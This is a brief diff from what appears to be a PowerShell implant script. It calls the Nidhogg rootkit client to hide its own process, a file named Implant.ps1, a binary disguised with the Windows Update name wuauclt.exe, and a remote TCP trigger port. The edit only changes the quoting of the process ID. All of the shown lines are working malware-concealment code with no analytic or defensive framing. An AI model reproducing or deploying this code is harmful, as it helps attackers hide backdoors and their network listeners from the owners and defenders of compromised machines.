@@ -26,7 +26,7 @@ Invoke-Nidhogg "process hide $PID"
 Invoke-Nidhogg "process hide $PID"
 
 # Initial hiding
-& $NidhoggClient process hide "$PID"
+& $NidhoggClient process hide $PID
 & $NidhoggClient file hide "$AppDir\Implant.ps1"
 & $NidhoggClient file hide "$AppDir\wuauclt.exe"
 & $NidhoggClient port hide "$TriggerPort" tcp remote
